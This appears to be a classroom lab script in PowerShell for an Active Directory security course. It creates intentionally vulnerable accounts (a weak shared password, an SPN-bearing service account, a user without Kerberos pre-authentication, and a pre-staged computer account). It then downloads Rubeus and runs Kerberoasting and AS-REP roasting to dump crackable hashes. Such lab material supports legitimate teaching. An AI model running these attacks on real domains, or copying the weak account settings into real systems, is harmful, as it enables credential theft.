New-ADUser -Name "svc_webapp" -SamAccountName "svc_webapp" -AccountPassword (ConvertTo-SecureString "P@ssword1" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity svc_webapp -ServicePrincipalNames @{Add="HTTP/webapp01.adshclass.com"}
New-ADUser -Name "legacy_user" -SamAccountName "legacy_user" -AccountPassword (ConvertTo-SecureString "P@ssword1" -AsPlainText -Force) -Enabled $true
Set-ADAccountControl -Identity legacy_user -DoesNotRequirePreAuth $true
djoin /PROVISION /DOMAIN adshclass.com /MACHINE oldserver /SAVEFILE C:\oldserver /DEFPWD /PRINTBLOB /NETBIOS oldserver 
New-Item -ItemType Directory -Path "C:\ADSH\Kerberos" -Force
cd C:\ADSH\Kerberos
Invoke-WebRequest -URI "https://github.com/DefensiveOrigins/SharpCollection/raw/refs/heads/master/NetFramework_4.0_Any/Rubeus.exe" -OutFile c:\ADSH\Kerberos\rubeus.exe
ls c:\ADSH\Kerberos | Select-Object Name, Length
cd C:\ADSH\Kerberos
./Rubeus.exe kerberoast /outfile:spns.txt
cd C:\ADSH\Kerberos
./Rubeus.exe asreproast /outfile:asreproast.txt 